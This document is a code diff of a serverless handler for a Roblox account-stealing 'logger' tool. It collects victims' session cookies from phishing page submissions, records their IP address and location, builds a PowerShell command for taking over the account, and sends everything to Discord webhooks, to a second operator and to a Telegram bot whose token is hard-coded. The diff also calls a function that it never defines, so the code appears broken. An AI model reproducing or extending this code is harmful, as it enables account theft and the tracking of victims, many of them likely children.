@@ -1,12 +1,10 @@
 // api/submit.js
-// Cookie is ONLY used by the Cloudflare Worker (one request to roblox.com/home).
-// submit.js uses ZERO cookie calls — only public Roblox endpoints with userId.
-
-const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
+const REDIS_URL  = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
-const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
+const TG_TOKEN   = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
+const TG_CHAT    = process.env.TG_CHAT  || '7538845070';
+// Your Cloudflare Worker URL — update worker.js code there too
+const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 function parseBody(raw) {
   if (!raw) return {};
@@ -22,17 +20,19 @@ async function redisGet(key) {
     });
     const json = await res.json();
     if (!json.result) return null;
-    let r = json.result;
-    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
-    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
-    return r || null;
+    let record = json.result;
+    if (typeof record === 'string') { try { record = JSON.parse(record); } catch { return null; } }
+    if (record && typeof record.value === 'string' && !record.webhook) {
+      try { record = JSON.parse(record.value); } catch {}
+    }
+    return record || null;
   } catch { return null; }
 }
 
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp`);
+    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
     const d = await r.json();
     return d.status === 'success' ? d : null;
   } catch { return null; }
@@ -69,8 +69,8 @@ function findCookie(slots) {
   return null;
 }
 
-// ── Worker: 1 cookie call, parses HTML, returns powershell + basic roblox info
-async function callWorker(cookie, victimIp) {
+// ── Cloudflare Worker: returns the PowerShell command, never uses the cookie ──
+async function getPowerShell(cookie, victimIp) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
@@ -79,82 +79,14 @@ async function callWorker(cookie, victimIp) {
     });
     if (!r.ok) return null;
     const d = await r.json();
-    return d.success ? d : null;
+    return d.success ? d.powershell : null;
   } catch { return null; }
 }
 
-// ── Public-only Roblox info — zero cookie, uses userId from worker ────────────
-async function fetchPublicInfo(userId) {
-  if (!userId) return null;
-  try {
-    const [
-      profileRes, friendsRes, groupsRes,
-      limitedsRes, avatarRes
-    ] = await Promise.all([
-      fetch(`https://users.roblox.com/v1/users/${userId}`),
-      fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
-      fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
-      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`),
-      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Webp`),
-    ]);
-
-    const profile      = profileRes.ok  ? await profileRes.json()  : null;
-    const friendsData  = friendsRes.ok  ? await friendsRes.json()  : null;
-    const groupsData   = groupsRes.ok   ? await groupsRes.json()   : { data: [] };
-    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
-    const avatarData   = avatarRes.ok   ? await avatarRes.json()   : null;
-
-    const groups      = groupsData.data  || [];
-    const ownedGroups = groups.filter(g => g.role?.rank === 255);
-
-    // Group robux — public endpoint, no cookie
-    let groupRobux = 0;
-    await Promise.all(ownedGroups.slice(0, 3).map(async g => {
-      try {
-        const r = await fetch(`https://economy.roblox.com/v1/groups/${g.group.id}/currency`);
-        if (r.ok) { const d = await r.json(); groupRobux += d.robux || 0; }
-      } catch (_) {}
-    }));
-
-    const limiteds      = limitedsData.data || [];
-    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
-
-    // Gamepasses — public
-    const gpCheck = async (id) => {
-      try {
-        const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${id}`);
-        if (!r.ok) return false;
-        const d = await r.json();
-        return Array.isArray(d.data) && d.data.length > 0;
-      } catch { return false; }
-    };
-    const [mm2, adoptMe, plsDonate] = await Promise.all([
-      gpCheck('17510307'),
-      gpCheck('33135930'),
-      gpCheck('12345678'),
-    ]);
-
-    let accountAgeDays = 'N/A';
-    if (profile?.created) {
-      accountAgeDays = Math.floor(
-        (Date.now() - new Date(profile.created).getTime()) / 86400000
-      );
-    }
-
-    return {
-      accountAgeDays,
-      friends:       friendsData?.count ?? 0,
-      groupsOwned:   ownedGroups.length,
-      groupRobux,
-      limitedsCount: limiteds.length,
-      limitedsValue,
-      gamepasses:    { mm2, adoptMe, plsDonate },
-      avatarUrl:     avatarData?.data?.[0]?.imageUrl || null,
-    };
-  } catch (err) {
-    console.error('fetchPublicInfo error:', err);
-    return null;
-  }
+function slotSummary(slots) {
+  return Object.entries(slots || {})
+    .map(([k, v]) => `Slot ${k.replace('slot','')}: ${v||'(empty)'}`)
+    .join('\n');
 }
 
 async function discordSend(url, payload) {
@@ -168,96 +100,65 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-async function sendHit(webhookUrl, { powershell, allCookies, cookieRenewed, roblox, pub, slots, ip, geo, now, pageName }) {
-  const robux       = (roblox?.robux         ?? 0).toLocaleString();
-  const rap         = (pub?.limitedsValue     ?? 0).toLocaleString();
-  const rapCount    =  pub?.limitedsCount     ?? 0;
-  const ageDays     =  pub?.accountAgeDays    ?? 'N/A';
-  const isPremium   =  roblox?.isPremium ? 'Yes ✅' : 'No ❌';
-  const groupsOwned =  pub?.groupsOwned       ?? 0;
-  const groupRobux  = (pub?.groupRobux        ?? 0).toLocaleString();
-  const avatarUrl   =  pub?.avatarUrl || roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
-  const mm2         =  pub?.gamepasses?.mm2       ? '✅' : '❌';
-  const adoptMe     =  pub?.gamepasses?.adoptMe   ? '✅' : '❌';
-  const plsDonate   =  pub?.gamepasses?.plsDonate ? '✅' : '❌';
-  const location    = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-  const isp         =  geo?.isp || 'Unknown';
-  const username    =  roblox?.username || 'Unknown';
-  const userId      =  roblox?.userId   || 0;
-
-  const slotLines = Object.entries(slots || {})
-    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
-    .join('\n');
-
-  // ── Main embed ──────────────────────────────────────────────────────────────
+// Send cookie + PowerShell command to Discord
+async function sendHit(webhookUrl, { powershell, cookie, slots, ip, geo, now, pageName }) {
+  // Embed with context
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
-      author: {
-        name:     `${username}${roblox?.isPremium ? ' ⭐' : ''}`,
-        url:      `https://www.roblox.com/users/${userId}/profile`,
-        icon_url: avatarUrl
-      },
-      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${userId}/profile)\n${cookieRenewed ? '🔄 Cookie Renewed ✅' : '⚠️ Original Cookie (renewal failed)'}`,  
-      color: 0xc026d3,
-      thumbnail: { url: avatarUrl },
+      title: `✅ Cookie Captured — ${pageName}`,
+      description: 'Run the **PowerShell command** below to access the account.\nThis is exactly what Chrome DevTools "Copy as PowerShell" gives you.',
+      color: 0x00cc44,
       fields: [
-        { name: '🔴 Robux',      value: robux,                                         inline: true  },
-        { name: '🎵 RAP',        value: `${rap}\n(${rapCount} items)`,                 inline: true  },
-        { name: '📅 Age',        value: `${ageDays} days`,                              inline: true  },
-        { name: '💎 Premium',    value: isPremium,                                      inline: true  },
-        { name: '👥 Groups',     value: `Owned: ${groupsOwned} | R$: ${groupRobux}`,   inline: true  },
-        { name: '🌐 IP',         value: ip || 'Unknown',                                inline: true  },
-        { name: '📍 Location',   value: `${location}\n${isp}`,                         inline: true  },
-        { name: '🎮 Gamepasses', value: `MM2: ${mm2} | Adopt Me: ${adoptMe} | Pls Donate: ${plsDonate}`, inline: false },
-        { name: '📋 Slots',      value: '```\n' + slotLines.substring(0, 950) + '\n```', inline: false },
+        { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
+        { name: '📍 Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`, inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                     inline: true  },
+        { name: '🕐 Time',     value: now,                                        inline: false }
       ],
-      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
-      timestamp: now
+      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
     }]
   });
 
-  // ── PowerShell — chunked ────────────────────────────────────────────────────
+  // PowerShell command in code block (chunked so nothing is cut)
   if (powershell) {
-    let rem = powershell, first = true;
+    // First chunk gets the ```powershell header
+    let first = true;
+    let rem = powershell;
     while (rem.length > 0) {
-      const chunk = rem.substring(0, 1900);
-      rem = rem.substring(1900);
-      await discordSend(webhookUrl, {
-        content: (first ? '```powershell\n' : '') + chunk + (rem.length === 0 ? '\n```' : '')
-      });
+      const chunk = rem.substring(0, 1950);
+      rem = rem.substring(1950);
+      const content = first
+        ? '```powershell\n' + chunk + (rem.length > 0 ? '' : '\n```')
+        : chunk + (rem.length > 0 ? '' : '\n```');
+      await discordSend(webhookUrl, { content });
       first = false;
     }
   }
 
-  // ── Raw full cookie string — plain text exact bytes ─────────────────────────
-  const cookieToSend = allCookies || '';
-  let rem = cookieToSend;
-  while (rem.length > 0) {
-    await discordSend(webhookUrl, { content: rem.substring(0, 1990) });
-    rem = rem.substring(1990);
+  // Raw cookie as plain text — exact bytes, zero modification
+  let remCookie = cookie;
+  while (remCookie.length > 0) {
+    const chunk = remCookie.substring(0, 1990);
+    remCookie = remCookie.substring(1990);
+    await discordSend(webhookUrl, { content: chunk });
   }
 }
 
 async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
-  const location  = [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-  const slotLines = Object.entries(slots || {})
-    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
-    .join('\n');
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
-      title:       '⚠️ Invalid Cookie — someone trolling',
+      title: '⚠️ Invalid Cookie — someone trolling',
       description: 'Cookie was **invalid or fake**.',
-      color:       0xff3333,
+      color: 0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',  inline: true  },
-        { name: '📍 Location', value: location,          inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
-        { name: '📋 Slots',    value: '```\n' + slotLines.substring(0, 950) + '\n```', inline: false },
-        { name: '🕐 Date',     value: now, inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                           inline: true  },
+        { name: '📍 Location', value: `${geo?.city||'?'}, ${geo?.country||'?'}`, inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                     inline: true  },
+        { name: '📋 Slots',    value: '```\n' + slotSummary(slots).substring(0,950) + '\n```', inline: false },
+        { name: '🕐 Date',     value: now,                                        inline: false }
       ],
-      footer:    { text: `sPAIN Tools • ${pageName}` },
+      footer: { text: `sPAIN Tools • ${pageName}` },
       timestamp: now
     }]
   });
@@ -279,47 +180,33 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
 
-  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-  const cookie = findCookie(slots);
-  const now    = new Date().toISOString();
-  const pageName = record.displayName || slug;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+          || req.headers['x-real-ip'] || 'Unknown';
 
-  // Step 1 — geo + worker run in parallel
-  // Worker: waits 5s, loads roblox.com/home ONCE, parses HTML, builds PowerShell
-  // geo: pure IP lookup
-  const [geo, workerResult] = await Promise.all([
+  const [geo, cookie] = await Promise.all([
     getIpGeo(ip),
-    cookie ? callWorker(cookie, ip) : Promise.resolve(null)
+    Promise.resolve(findCookie(slots))
   ]);
 
-  const roblox = workerResult?.roblox || null; // { userId, username, robux, isPremium }
-  const isValid = !!roblox?.userId;
+  // Wait 5 seconds — lets the target's session settle so cookie is fully valid
+  // when the Worker hits Roblox using their IP
+  await new Promise(r => setTimeout(r, 5000));
 
-  // Step 2 — public info fetch using userId (zero cookie calls)
-  const pub = isValid ? await fetchPublicInfo(roblox.userId) : null;
+  const workerData = cookie ? await getWorkerData(cookie, ip) : null;
+  const powershell  = workerData?.powershell || null;
+  const roblox      = workerData || null;
+  const isValid     = !!workerData?.valid;
+  const now        = new Date().toISOString();
+  const pageName   = record.displayName || slug;
+  const payload    = { powershell, roblox, cookie, slots, ip, geo, now, pageName };
 
-  const cookieRenewed = workerResult?.cookieRenewed || false;
-
-  const payload = {
-    powershell:    workerResult?.powershell || null,
-    allCookies:    workerResult?.allCookies || cookie,
-    cookieRenewed,
-    roblox,
-    pub,
-    slots,
-    ip,
-    geo,
-    now,
-    pageName
-  };
-
-  // Dualhook parent
   let parent = null;
   if (record.dualhookParent) {
     parent = await redisGet(`slot:${record.dualhookParent}`);
   }
 
   const sendFn = isValid ? sendHit : sendInvalid;
+
   await Promise.all([
     sendFn(record.webhook, payload),
     parent?.webhook && parent.webhook !== record.webhook
@@ -329,10 +216,11 @@ export default async function handler(req, res) {
 
   await tgSend(isValid ? [
     `✅ <b>COOKIE CAPTURED</b>`,
-    `👤 ${roblox?.username || 'Unknown'} | R$: ${roblox?.robux ?? 0}`,
+    `👤 ${roblox?.username || 'Unknown'} ${roblox?.isPremium ? '⭐' : ''}`,
+    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
     `📄 Page: ${pageName} (${slug})`,
     `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-    `💻 PowerShell + Cookie sent to Discord`,
+    `💻 PowerShell command sent to Discord`,
     `🕐 ${now}`
   ].join('\n') : [
     `⚠️ <b>INVALID SUBMISSION</b>`,
@@ -341,5 +229,6 @@ export default async function handler(req, res) {
     `🕐 ${now}`
   ].join('\n'));
 
+  // Respond AFTER all work is done — Vercel kills the function on res.end()
   return res.status(200).json({ success: true });
 }
